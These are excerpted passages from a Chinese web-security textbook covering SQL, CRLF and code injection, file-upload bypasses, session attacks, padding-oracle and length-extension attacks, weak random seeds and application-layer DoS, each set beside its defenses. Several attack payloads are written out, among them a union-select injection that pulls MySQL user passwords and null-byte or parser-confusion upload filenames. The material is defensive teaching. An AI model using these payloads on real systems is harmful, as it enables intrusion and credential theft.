用户输入做一些escape处理，这是不够的。参考如下代码： $sql = "SELECT id, name, mail, cv, blog, twitter FROM register WHERE id=".mysql_real_escape_string($_GET['id']);当攻击者构造的注入代码如下时： http://vuln.example.com/user.php? id=12, AND,1=0, union, select,1, concat(user,0x3a, passwo rd),3,4,5,6, from, mysql.user, where, user=substring_index(current_user(), char(64),1)将绕过mysql_real_escape_string的作用注入成功。这条语句执行的结果如下。[插图]因为mysql_real_escape_string() 仅仅会转义：❍ ’❍ “❍ \r❍ \n❍ NULL❍ Control-Z这几个字符，在本例中SQL注入所使用的Payload完全没有用到这几个字符。
 
 
其实这种基于黑名单的方法，都或多或少地存在一些问题，我们看看下面的案例。注入时不需要使用空格的例子： SELECT/＊＊/passwd/＊＊/from/＊＊/user SELECT(passwd)from(user)不需要括号、引号的例子，其中0x61646D696E是字符串admin的十六进制编码： SELECT passwd from users where user=0x61646D696E
 
 
使用预编译语句一般来说，防御SQL注入的最佳方式，就是使用预编译语句，绑定变量。比如在Java中使用预编译的SQL语句：
 
 
使用预编译的SQL语句，SQL语句的语义不会发生改变。在SQL语句中，变量用？表示，攻击者无法改变SQL的结构
 
 
$stmt = $mysqli->prepare($query); $stmt->bind_param("sss", $val1, $val2, $val3);
 
 
我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编语句译类似
 
 
存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。
 
 
可能无法使用预编译语句或存储过程，该怎么办？这时候只能再次回到输入过滤和编码等方法上来。
 
 
检查数据类型检查输入数据的数据类型，在很大程度上可以对抗SQL注入。
 
 
OWASP ESAPI中的实现。这个函数由安全专家编写，更值得信赖。ESAPI.encoder().encodeForSQL( new OracleCodec(), queryparam );
 
 
Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。
 
 
XML与HTML都是SGML（Standard Generalized Markup Language，标准通用标记语言）。
 
 
最终生成的XML文件里被插入一条数据： 
 
 
对用户输入数据中包含的“语言本身的保留字符”进行转义即可，如下所示：
 
 
攻击者可以提交如下数据： hallo'); var fImport = new JavaImporter(java.io.File); with(fImport) { var f = new File('new'); f.createNewFile(); } //
 
 
可以算是一种代码注入。 <% String pageToInclude = getDataFromUntrustedSource(); %> 代码注入多见于脚本语言，有时候代码注入可以造成命令注入（Command Injection）。比如： 
 
 
CRLF实际上是两个字符：CR是Carriage Return (ASCII 13, \r), LF是Line Feed (ASCII 10,\n)。\r\n这两个字符是用于表示换行的，其十六进制编码分别为0x0d、0x0a
 
 
下面这段代码，将登录失败的用户名写入日志文件中。 def log_failed_login(username) log = open("access.log", 'a') log.write("User login failed for: %s\n" % username) log.close()
 
 
就可能插入一条额外的日志记录。 guest\nUser login succeeded for: admin日志文件因为换行符“\n”的存在，会变为： User login failed for: guest User login succeeded for: admin第二条记录是伪造的，admin用户并不曾登录失败。
 
 
凡是使用CRLF作为分隔符的地方都可能存在这种注入，比如“注入HTTP头”。在HTTP协议中，HTTP头是通过“\r\n”来分隔的。因此如果服务器端没有过滤“\r\n
 
 
下面这个例子就是通过CRLF注入完成了一次XSS攻击。在参数中插入CRLF字符： 
testtest http%3A%2F%2Fwww.xiaonei.com%2FSysHome.do%0d%0a [%E7%99%BB%E5%BD%95] 
提交后完成了一次POST请求
 
 
在Set-Cookie的值里插入了两次“\r\n”换行符。而两次“\r\n”意味着HTTP头的结束，在两次CRLF之后跟着的是HTTP Body。攻击者在两次CRLF之后构造了恶意的HTML脚本，从而得以执行，XSS攻击成功。
第8章 文件上传漏洞
 
文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，
 
 
webshell的问题。要完成这个攻击，要满足如下几个条件：首先，上传的文件能够被Web容器解释执行。
 
 
用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。
 
 
，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。
 
 
如果攻击者手动修改了上传过程的POST包，在文件名后添加一个%00字节，则可以截断某些函数对文件名的判断。因为在许多语言的函数中，比如在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符。
 
 
比如应用原本只允许上传JPG图片，那么可以构造文件名（需要修改POST包）为xxx.php[\0].JPG，其中[\0]为十六进制的0x00字符
 
 
为了绕过应用中类似MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后，
 
 
如下情况，因为Web Server将此文件名当做PHP文件来解析，因此PHP代码会执行；若上传文件后缀是．JPG，则Web Server很有可能会将此文件当做静态文件解析，而不会调用PHP解释器
 
 
Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止。比如： Phpshell.php.rar.rar.rar.rar.rar因为Apache不认识．rar这个文件类型，所以会一直遍历后缀到 ．php，然后认为这是一个PHP类型的文件。
 
 
这些文件类型定义在Apache的mime.types文件中。
 
 
IS 6在处理文件解析时，也出过一些漏洞。前面提到的0x00字符截断文件名，在IIS和Windows环境下曾经出过非常类似的漏洞，不过截断字符变成了分号“; ”。当文件名为abc.asp; xx.jpg时，IIS 6会将此文件解析为abc.asp，文件名被截断了，从而导致脚本被执行
 
 
因为处理文件夹扩展名出错，导致将/*.asp/目录下的所有文件都作为ASP文件进行解析。比如： http://www.target.com/path/xyz.asp/abc.jpg
 
 
IIS中，如果目录支持写权限，同时开启了WebDav，则会支持PUT方法，再结合MOVE方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行webshell。MOVE能否执行成功，取决于IIS服务器是否勾选了“脚本资源访问”复选框一般要实施此攻击过程，攻击者应先通过OPTIONS方法探测服务器支持的HTTP方法类型，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写为脚本文件。
 
 
通过OPTIONS探测服务器信息。[插图]返回：[插图]第二步：上传文本文件。[插图]返回：
 
 
2010年5月，国内的安全组织80sec发布了一个Nginx的漏洞，指出在Nginx配置fastcgi使用PHP时，会存在文件类型解析问题，这将给上传漏洞大开方便之门。
 
 
当访问 http://www.xxx.com/path/test.jpg/notexist.php时，会将test.jpg当做PHP进行解析。Notexist.php是不存在的文件。
 
 
Nginx的参考配置如下。 location ～ \.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params; }
 
 
出现这个漏洞的原因与“在fastcgi方式下，PHP获取环境变量的方式”有关。PHP的配置文件中有一个关键的选项：cgi.fix_pathinfo，这个选项默认是开启的： cgi.fix_pathinfo = 1
 
 
两个环境变量很重要：一个是PATH_INFO，一个是SCRIPT_FILENAME。在上面的例子中： PATH_INFO = notexist.php这个选项为1时，在映射URI时，将递归查询路径确认文件的合法性。notexist.php是不存在的
 
 
这个往前递归的功能原本是想解决 /info.php/test这种URL，能够正确地解析到info.php上。此时SCRIPT_FILENAME需要检查文件是否存在，所以会是/path/test.jpg。而PATH_INFO此时还是notexist.php，在最终执行时，test.jpg会被当做PHP进行解析。
 
 
URL中不会出现钓鱼地址，更具有欺骗性。比如下面这张图片： http://tech.simba.taobao.com/wp-content/uploads/2011/02/item.jpg?1_117它的实际内容是： png 其中，png是伪造的文件头，用于绕过上传时的文件类型检查
 
 
骗子在传播钓鱼网站时，只需要传播合法图片的URL： http://tech.simba.taobao.com/wp-content/uploads/2011/02/item.jpg?1_117在正常情况下，浏览器是不会将jpg文件当做HTML执行的，但是在低版本的IE中，比如IE 6和IE 7，包括IE 8的兼容模式，浏览器都会“自作聪明”地将此文件当做HTML执行
 
 
文件上传的目录设置为不可执行只要Web容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响
 
 
．判断文件类型在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单的方式
 
 
使用随机数改写文件名和文件路径文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用使用随机数改写了文件名和路径，将极大地增加攻击的成本
 
 
单独设置文件服务器的域名由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决
第9章 认证与会话管理
 
认证实际上就是一个验证凭证的过程。如果只有一个凭证被用于认证，则称为“单因素认证”；如果有两个或多个凭证被用于认证，则称为“双因素（Two Factors）认证”或“多因素认证”。一般来说，多因素认证的强度要高于单因素认证
 
 
密码策略稍作总结。密码长度方面：❍ 普通应用要求长度为6位以上；❍ 重要应用要求长度为8位以上，并考虑双因素认证。密码复杂度方面：❍ 密码区分大小写字母；❍ 密码为大写字母、小写字母、数字、特殊符号中两种以上的组合；❍ 不要有连续性的字符，比如1234abcd，这种字符顺着人的思路，所以很容易猜解；❍ 尽量避免出现重复的字符，比如1111。除了OWASP推荐的策略外，还需要注意，不要使用用户的公开数据
 
 
密码的保存也有一些需要注意的地方。一般来说，密码必须以不可逆的加密算法，或者是单向散列函数算法，加密后存储在数据库中。这样做是为了尽最大可能地保证密码的私密性
 
 
将明文密码经过哈希后（比如MD5或者SHA-1）再保存到数据库中，是目前业界比较普遍的做法——在用户注册时就已将密码哈希后保存在数据库中
 
 
目前黑客们广泛使用的一种破解MD5后密码的方法是“彩虹表（Rainbow Table）”。
 
 
Salt应该保存在服务器端的配置文件中，并妥善保管。
 
 
中国最大的在线支付平台支付宝[插图]，就提供很多种不同的认证手段：[插图]
 
 
除了支付密码外，手机动态口令、数字证书、宝令、支付盾、第三方证书等都可用于用户认证。
 
 
Session劫持就是一种通过窃取用户SessionID后，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。
 
 
SessionID除了可以保存在Cookie中外，还可以保存在URL中，作为请求的一个参数。但是这种方式的安全性难以经受考验。
 
 
典型的场景就是通过Referer泄露URL中的sid, QQ的WAP邮箱曾经出过此漏洞[插图]，测试过程如下。
 
 
手机浏览器在解析图片时，实际上是发起了一次GET请求，这个请求会带上Referer。Referer的值为：[插图]可以看到sid就包含在Referer中，在www.inbreak.net的服务器日志中可以查看到此值，QQ邮箱的sid由此泄露了。
 
 
Session Fixation呢？举一个形象的例子，假设A有一辆汽车，A把汽车卖给了B，但是A并没有把所有的车钥匙交给B，还自己藏下了一把。这时候如果B没有给车换锁的话，A仍然是可以用藏下的钥匙使用汽车的。这个没有换“锁”而导致的安全问题，就是Session Fixation问题。
 
 
用户X（攻击者）先获取到一个未经认证的SessionID，然后将这个SessionID交给用户Y去认证，Y完成认证后，服务器并未更新此SessionID的值（注意是未改变SessionID，而不是未改变Session），所以X可以直接凭借此SessionID登录进Y的账户。
 
 
X如何才能让Y使用这个SessionID呢？如果SessionID保存在Cookie中，比较难做到这一点。但若是SessionID保存在URL中，则X只需要诱使Y打开这个URL即可。
 
 
认证前的URL是 http://bbs.xxxx.com/wap/index.php? action=forum&fid=72&sid=2iu2pf其中，sid是用于认证的SessionID。用户登录后，这个sid没有发生改变，因此黑客可以先构造好此URL，并诱使其他用户打开，当用户登录完成后，黑客也可以直接通过此URL进入用户账户。解决Session Fixation的正确做法是，在登录完成后，重写SessionID。
 
 
增加或改变用于认证的Cookie值。值得庆幸的是，在今天使用Cookie才是互联网的主流，sid的方式渐渐被淘汰。而由于网站想保存到Cookie中的东西变得越来越多，因此用户登录后，网站将一些数据保存到关键的Cookie中
 
 
出于用户体验的考虑，只要这个用户还“活着”，就不会让这个用户的Session失效。从而攻击者可以通过不停地发起访问请求，让Session一直“活”下去。
 
 
代码保持Session：[插图]
 
 
网站访问量如果比较大，维护Session可能会给网站带来巨大的负担。因此，有一种做法，就是服务器端不维护Session，而把Session放在Cookie中加密保存。当浏览器访问网站时，会自动带上Cookie，服务器端只需要解密Cookie即可得到当前用户的Session了
 
 
Cookie的Expire时间是完全可以由客户端控制的。篡改这个时间，并使之永久有效，就有可能获得一个永久有效的Session
 
 
强制销毁Session。这个时间可以是从用户登录的时间算起，设定一个阈值，比如3天后就强制Session过期。
 
 
还可以选择的方法是当用户客户端发生变化时，要求用户重新登录。比如用户的IP、UserAgent等信息发生了变化，就可以强制销毁当前的Session
 
 
还需要考虑的是同一用户可以同时拥有几个有效Session。若每个用户只允许拥有一个Session，则攻击者想要一直保持一个Session也是不太可能的。当用户再次登录时，攻击者所保持的Session将被“踢出”。
 
 
单点登录的英文全称是Single Sign On，简称SSO。它希望用户只需要登录一次，就可以访问所有的系统。从用户体验的角度看，SSO无疑让用户的使用更加的方便；从安全的角度看，SSO把风险集中在单点上，这样做是有利有弊的。
 
 
再单独实现一些额外的认证机制。比如网上支付平台，在付款前要求用户再输入一次密码，或者通过手机短信验证用户身份等。
 
 
目前互联网上最为开放和流行的单点登录系统是OpenID。OpenID是一个开放的单点登录框架，它希望使用URI作为用户在互联网上的身份标识，每个用户（End User）将拥有一个唯一的URI。
 
 
用户只需要提交他的OpenID（就是用户唯一的URI）以及OpenID的提供者（OpenID Provider），网站就会将用户重定向到OpenID的提供者进行认证，认证完成后再重定向回网站。
第10章 访问控制
 
在上一章中，我们曾指出“认证（Authentication）”与“授权（Authorization）”的不同。“认证”解决了
 
 
需要保护的页面“藏”起来，并不是解决问题的办法。攻击者惯用的伎俩是使用一部包含了很多后台路径的字典
 
 
用户与权限之间的对应关系，现在应用广泛的一种方法，就是“基于角色的访问控制（Role-Based Access Control）”，简称RBAC。
 
 
http://u.youku.com/my_mail/type_read_ref_outbox_id_52380790_desc_1? __rt=1&__ro=myOutb oxList http://u.youku.com/my_video/type_editfolder_step_1_id_4774704? __rt=1&__ro=myPlaylistL ist漏洞分析：URL经过rewrite后将参数映射成URL路径，但这并不妨碍通过修改用户id来实现攻击
 
 
相对于垂直权限管理来说，水平权限问题出在同一个角色上。系统只验证了能访问数据的角色，既没有对角色内的用户做细分，也没有对数据的子集做细分，因此缺乏一个用户到数据之间的对应关系。
 
 
水平权限管理又可以称之为“基于数据的访问控制”。
 
 
一个简单的数据级访问控制，可以考虑使用“用户组（Group）”的概念。比如一个用户组的数据只属于该组内的成员，只有同一用户组的成员才能实现对这些数据的操作。
 
 
Auth是一个在不提供用户名和密码的情况下，授权第三方应用访问Web资源的安全协议。
 
 
OAuth与OpenID都致力于让互联网变得更加的开放。OpenID解决的是认证问题，OAuth则更注重授权。认证与授权的关系其实是一脉相承的
 
 
授权MSN将用户的好友名单提供给人人网。在OAuth 1.0中，涉及3个角色，分别是：❍ Consumer：消费方（Client）❍ Service Provider：服务提供方（Server）❍ User：用户（Resource Owner）
 
 
如果Jane授权成功（点击“Approve”按钮）, faji.com会将Jane带来的临时凭证（Temporary Credentials）标记为“Jane已经授权”，同时跳转回beppa.com，并带上临时凭证（Temporary Credentials）。凭此，beppa.com知道它可以去获取Jane的私有照片了。[插图]对于beppa.com来说，它首先通过Request Token去faji.com换取Access Token，然后就可以用Access Token访问资源了。Request Token只能用于获取用户的授权，Access Token才能用于访问用户的资源。
 
 
目前有以下这些比较知名的OAuth库可供开发者选择：ActionScript/Flash oauth-as3 http://code.google.com/p/oauth-as3/ A flex oauth client http://www.arcgis.com/home/item.html? id=ff6ffa302ad04a7194999f2ad08250d7C/C++ QTweetLib http://github.com/minimoog/QTweetLib libOAuth http://liboauth.sourceforge.net/clojure clj-oauth http://github.com/mattrepl/clj-oauth.net oauth-dot-net http://code.google.com/p/oauth-dot-net/ DotNetOpenAuth http://www.dotnetopenauth.net/Erlang erlang-oauth http://github.com/tim/erlang-oauthJava Scrible http://github.com/fernandezpablo85/scribe-java oauth-signpost http://code.google.com/p/oauth-signpost/JavaScript oauth in js http://oauth.googlecode.com/svn/code/javascript/ Objective-C/Cocoa & iPhone programming OAuthCore http://bitbucket.org/atebits/oauthcore MPOAuthConnection http://code.google.com/p/mpoauthconnection/ Objective-C OAuth http://oauth.googlecode.com/svn/code/obj-c/Perl Net::OAuth http://oauth.googlecode.com/svn/code/perl/PHP tmhOAuth http://github.com/themattharris/tmhOAuth oauth-php http://code.google.com/p/oauth-php/Python python-oauth2 http://github.com/brosner/python-oauth2Qt qOauth http://github.com/ayoy/qoauthRuby Oauth ruby gem http://oauth.rubyforge.org/Scala DataBinder Dispatch http://dispatch.databinder.net/AboutOAuth 1.0已经成为了RFC标准，但OAuth 2.0仍然在紧锣密鼓的制定中，到2011年年底已经有了一个较为稳定的版本。OAuth 2.0吸收了OAuth 1.0的经验，做出了很多调整。它大大地简化了流程，改善了用户体验。两者并不兼容，但从流程上看区别不大。
第11章 加密算法与随机数
 
攻击者有可能找到相同的IV，则在相同IV的情况下仍然可以实施“Reused Key Attack”。在“WEP破解”一节中，就是找到了相同的IV
 
 
攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式，被称为Bit-flipping Attack[插图]。
 
 
解决Bit-flipping攻击的方法是验证密文的完整性，最常见的方法是增加带有KEY的MAC（消息验证码，Message Authentication Code）
 
 
流密码加密算法存在“Reused Key Attack”和“Bit-flipping Attack”等攻击方式。而在现实中，一种最著名的针对流密码的攻击可能就是WEP密钥的破解。WEP是一种常用的无线加密传输协议
 
 
一个是初始化向量IV，一个是对消息的CRC-32校验。而这两者都可以通过一些方法克服。IV以明文的形式发送，在WEP中采用24bit的IV，但这其实不是很大的一个值。假设一个繁忙的AP，以11Mbps的速度发送大小为1500bytes的包，则1500*8/(11*10^6)*2^24 = ～18000秒，约为5个小时。因此最多5个小时，IV就将耗光，不得不开始出现重复的IV。在实际情况中，并非每个包都有1500bytes大小，因此时间会更短。IV一旦开始重复，就会使得“Reused Key Attack”成为可能。同时通过收集大量的数据包，找到相同的IV，构造出相同的CRC-32校验值
 
 
常见的加密模式有：ECB、CBC、CFB、OFB、CTR等。如果加密模式被攻击，那么不论加密算法的密钥有多长，都可能不再安全。
 
 
ASP.NET存在的Padding Oracle问题[插图]。在2011年的Pwnie Rewards[插图]中，ASP.NET的这个漏洞被评为“最具价值的服务器端漏洞”。
 
 
需要把消息进行分组（block）, block的大小常见的有64bit、128bit、256bit等。以CBC模式为例，其实现加密的过程大致如下：
 
 
利用应用的错误回显，攻击者往往可以判断出padding是否正确。所以Padding Oracle实际上是一种边信道攻击，攻击者只需要知道密文的解密结果是否正确即可，而这往往有许多途径。
 
 
慢慢调整IV的值，以希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01。
 
 
初始化向量IV与明文进行XOR运算得到了Intermediary Value，因此将刚才得到的Intermediary Byte:0x3D与真实IV的最后一个字节0x0F进行XOR运算，既能得到明文。 0x3D ^ 0x0F = 0x320x32是2的十六进制形式，正好是明文！
 
 
继续推导出剩下的Intermediary Byte。根据padding的标准，当需要padding两个字节时，其值应该为0x02, 0x02。而我们已经知道了最后一个Intermediary Byte为0x3D，因此可以更新IV的第8个字节为0x3D ^ 0x02 = 0x3F，此时可以开始遍历IV的第7个字节（0x00～0xFF）。[插图]通过遍历可以得出，IV的第7个字节为0x24，对应的Intermediary Byte为0x26。
 
 
获得Intermediary Value后，通过与原来的IV进行XOR运算，即可得到明文。在这个过程中，仅仅用到了密文和IV，通过对padding的推导，即可还原出明文，而不需要知道密钥是什么。而IV并不需要保密，它往往是以明文形式发送的。
 
 
Brian Holyfield[插图]实现了一个叫padbuster[插图]的工具，可以自动实施Padding Oracle攻击
 
 
密钥管理中最常见的错误，就是将密钥硬编码在代码里。比如下面这段代码，就将Hash过的密码硬编码在代码中用于认证
 
 
将加密密钥、签名的salt等“key”硬编码在代码中，是非常不好的习惯。
 
 
对于Web应用来说，常见的做法是将密钥（包括密码）保存在配置文件或者数据库中，在使用时由程序读出密钥并加载进内存
 
 
一个比较安全的密钥管理系统，可以将所有的密钥（包括一些敏感配置文件）都集中保存在一个服务器（集群）
 
 
Debian上的OpenSSL包中存在弱伪随机数算法。产生这个问题的原因，是由于编译时会产生警告（warning）信息，因此下面的代码被移除了。 MD_Update(&m, buf, j); [ .. ] MD_Update(&m, buf, j); /＊ purify complains ＊/这直接导致的后果是，在OpenSSL的伪随机数生成算法中，唯一的随机因子是pid。而在Linux系统中，pid的最大值也是32768。
 
 
Web应用中，使用伪随机数的地方非常广泛。密码、key、SessionID、token等许多非常关键的“secret”往往都是通过伪随机数算法生成的。如果使用了弱伪随机数算法，则可能会导致非常严重的安全问题。
 
 
$passwd = substr(md5(print_r(microtime(), true)),0,6); ……这个新生成的 $passwd，是直接调用了microtime() 后，取其MD5值的前6位
 
 
PHP中的microtime()由两个值合并而成，一个是微秒数，一个是系统当前秒数。因此只需要获取到服务器的系统时间，就可以以此时间为基数，按次序递增，即可猜解出新生成的密码
 
 
开发程序时，要切记：不要把时间函数当成随机数使用。
 
 
它真正随机的地方在于“种子（seed）”。种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得值的顺序也是固定的。
 
 
建立在这个基础上，就可以得到一种可行的攻击方式：（1）通过一些方法猜解出种子的值；（2）通过mt_srand()对猜解出的种子值进行播种；（3）通过还原程序逻辑，计算出对应的mt_rand()产生的伪随机数的值。
 
 
Stefan Esser描述这个攻击过程如下：（1）使用Keep-Alive HTTP请求在phpBB2论坛中搜索字符串 ‘a'；（2）搜索必然会出来很多结果，同时也泄露了search_id；（3）很容易通过该值猜解出随机数的种子；（4）攻击者仍然使用Keep-Alive HTTP头发送一个重置admin密码的请求给WordPress blog；（5）WordPress mt_rand() 生成确认链接，并发送到管理员邮箱；（6）攻击者根据已算出的种子，可以构造出此确认链接；（7）攻击者确认此链接（仍然使用Keep-Alive头）, WordPress将向管理员邮箱发送新生成的密码；（8）因为新密码也是由mt_rand()生成的，攻击者仍然可以计算出来；（9）从而攻击者最终获取了新的管理员密码。
 
 
在Java中，可以使用java.security.SecureRandom
 
 
Linux中，可以使用/dev/random或者 /dev/urandom来生成随机数，只需要读取即可
 
 
同时还写了一篇关于Flickr API签名可伪造的paper[插图]，和Padding Oracle的paper放在一起。
 
 
很多哈希算法都存在Length Extension攻击，这是因为这些哈希算法都使用了Merkle-Damgård hash construction进行数据压缩，流行算法比如MD5、SHA-1等都受到影响。
 
 
以MD5为例，首先算法将消息以512bit（就是64字节）的长度分组。最后一组必然不足512bit，这时算法就会自动往最后一组中填充字节，这个过程被称为padding。
 
 
当知道MD5(secret) 时，在不知道secret的情况下，可以很轻易地推算出MD5(secret||padding||m')。在这里m’ 是任意数据，|| 是连接符，可以为空。padding是secret最后的填充字节。
 
 
需要找到MD5(secret)最后压缩的值，并算出其padding，然后加入到下一轮的MD5压缩算法中，算出最终我们需要的值。理解Length Extension Attack
 
 
D5算法开始依次对每组消息进行压缩，经过64轮数学变换。在这个过程中，一开始会有定义好的初始化向量，为4个中间值，初始化向量不是随机生成的，是标准里定义死的——是的，你没看错，这是“硬编码”！
 
 
一个合理的签名，一般需要salt或者key加上参数值，而salt或者key都是未知的，也就使得原文是未知的。在Flickr API签名的问题中，Flickr API同时还犯了一个错误，这个错误Amazon的AWS签名也犯过[插图]——就是在签名校验算法中，参数连接时没有使用间隔符。所以本来如：?a=1&b=2&c=3的参数，在签名算法中连接时简单地变成了：a1b2c3那么攻击者可以伪造参数为：?a=1b2c3[....Padding....]&b=4&c=5最终在签名算法中连接时：a1b2c3[....Padding....]b4c5
 
 
第三种攻击方式：还记得HPP[插图]吗？附带相同的参数可能在不同的环境下造成不同的结果，从而产生一些逻辑漏洞
 
 
需要通过Length Extension伪造一个新的签名才行。?a=1&b=2&c=3&a=4&sig=sig_new最后，Length Extension需要知道的length，其实是可以考虑暴力破解的。Length Extension还有什么利用方式？尽情发挥你的想象力吧。
 
 
比如MD5(m+secret)，希望推导出MD5(m+secret||padding||m')，结果由于自动附加secret在末尾的关系，会变成MD5(m||padding||m'||secret)，从而导致Length Extension run不起来。
第12章 Web框架安全
 
一个优秀的安全方案，应该是：在正确的地方，做正确的事情。
 
 
要针对不同上下文的XSS攻击场景，使用不同的编码方式。在“跨站脚本攻击”一章中，我们将“输出编码”的防御方法总结为以下几种：❍ 在HTML标签中输出变量；❍ 在HTML属性中输出变量；❍ 在script标签中输出变量；❍ 在事件中输出变量；❍ 在CSS中输出变量；❍ 在URL中输出变量。针对不同的情况，使用不同的编码函数。那么现在流行的MVC框架是否符合这样的设计呢？答案是否定的。
 
 
Web框架来说，可以自动地在所有涉及POST的代码中添加token，这些地方包括所有的form表单、
 
 
完整的CSRF防御方案，对于Web框架来说有以下几处地方需要改动。（1）在Session中绑定token。如果不能保存到服务器端Session中，则可以替代为保存到Cookie里。（2）在form表单中自动填入token字段，比如 。（3）在Ajax请求中自动添加token，这可能需要已有的Ajax封装实现的支持。（4）在服务器端对比POST提交参数的token与Session中绑定的token是否一致，以验证CSRF攻击。
 
 
可以在两个地方做这件事情：（1）如果Web框架提供统一的跳转函数，则可以在跳转函数内部实现一个白名单，指定跳转地址只能在白名单中；（2）另一种解决方式是控制HTTP的Location字段，限制Location的值只能是哪些地址，也能起到同样的效果，其本质还是白名单。
 
 
Web容器、脚本语言提供的API都支持设置HttpOnly Cookie，所以很多时候需要由框架实现一个功能：对所有的Cookie默认添加HttpOnly
 
 
SQL注入是有积极意义的。我们知道对抗SQL注入的最佳方式就是使用“预编译绑定变量”
第13章 应用层拒绝服务攻击
 
DDOS攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击，其发现于1996年
 
 
SYN flood在攻击时，首先伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答
 
 
服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。
 
 
ookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。
 
 
“CC攻击”的前身是一个叫fatboy的攻击程序，当时黑客为了挑战绿盟的一款反DDOS设备开发了它。绿盟是中国著名的安全公司之一，它有一款叫“黑洞（Collapasar）”的反DDOS设备，能够有效地清洗SYN Flood等有害流量。而黑客则挑衅式地将fatboy所实现的攻击方式命名为：Challenge Collapasar（简称CC），
 
 
爬虫把小网站直接爬死的情况时有发生，这与应用层DDOS攻击的结果很像。由此看来，应用层DDOS攻击与正常业务的界线比较模糊。
 
 
实现一些对抗手段，比如限制每个IP地址的请求频率。下面我们将更深入地探讨还有哪些方法可以对抗应用层DDOS攻击。
 
 
CAPTCHA发明的初衷，是为了识别人与机器。但验证码如果设计得过于复杂，那么人也很难辨识出来，所以验证码是一把双刃剑。
 
 
因此一段需要计算的JavaScript，可以判断出客户端到底是不是浏览器。类似的，发送一个flash让客户端解析，也可以起到同样的作用。
 
 
在Apache的配置文件中，有一些参数可以缓解DDOS攻击。比如调小Timeout、KeepAliveTimeout值，增加MaxClients值。
 
 
目前已经有一些开源的Module全部或部分实现了针对应用层DDOS攻击的保护。“mod_qos”是Apache的一个Module，
 
 
Yahoo为我们提供了一个解决思路。因为发起应用层DDOS攻击的IP地址都是真实的，所以在实际情况中，攻击者的IP地址其实也不可能无限制增长。假设攻击者有1000个IP地址发起攻击，如果请求了10000次，则平均每个IP地址请求同一页面达到10次，攻击如果持续下去，单个IP地址的请求也将变多，但无论如何变，都是在这1000个IP地址的范围内做轮询。为此Yahoo实现了一套算法，根据IP地址和Cookie等信息，可以计算客户端的请求频率并进行拦截。
 
 
Yahoo为此申请了一个专利（Detecting system abuse[插图]），因此我们可以查阅此专利的公开信息，以了解更多的详细信息
 
 
Yahoo设计的这套防御体系，经过实践检验，可以有效对抗应用层DDOS攻击和一些类似的资源滥用攻击。但Yahoo并未将其开源
 
 
Slowloris[插图]是在2009年由著名的Web安全专家RSnake提出的一种攻击方法，其原理是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用
 
 
由于Web Server只收到了一个\r\n，因此将认为HTTP Headers部分没有结束，并保持此连接不释放，继续等待完整的请求。此时客户端再发送任意HTTP头，保持住连接即可。
 
 
Apache官方否认Slowloris的攻击方式是一个漏洞，他们认为这是Web Server的一种特性，通过调整参数能够缓解此类问题，给出的回应是参考文档[插图]中调整配置参数的部分。
 
 
其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以很低的速度发包，比如10～100s发一个字节，保持住这个连接不断开
 
 
Cookie也能造成一种拒绝服务，笔者称之为Server Limit DOS，并曾在笔者的博客文章[插图]中描述过这种攻击。
 
 
Web Server对HTTP包头都有长度限制，以Apache举例，默认是8192字节。也就是说，Apache所能接受的最大HTTP包头大小为8192字节（这里指的是Request Header，如果是Request Body，则默认的大小限制是2GB）。如果客户端发送的HTTP包头超过这个大小，服务器就会返回一个4xx错误
 
 
将向客户端写入一个超长的Cookie。要解决此问题，需要调整Apache配置参数LimitRequestFieldSize[插图]，这个参数设置为0时，对HTTP包头的大小没有限制。
 
 
因此决策算法将逐个尝试每个“下一个状态”，直到找到一个匹配的。比如这个正则表达式： ^(a+)+$当输入只有4个“a”时： aaaaX其执行过程如下：[插图]它只有16条可能的路径，引擎很快能遍历完。但是当输入以下字符串时： aaaaaaaaaaaaaaaaX就变成了65536条可能的路径；此后每增加一个“a”，路径的数量都会翻倍。
 
 
eDOS可能会成为一个埋藏在系统中的炸弹。下面是一些存在ReDOS的正则表达式写法。
第14章PHP安全
 
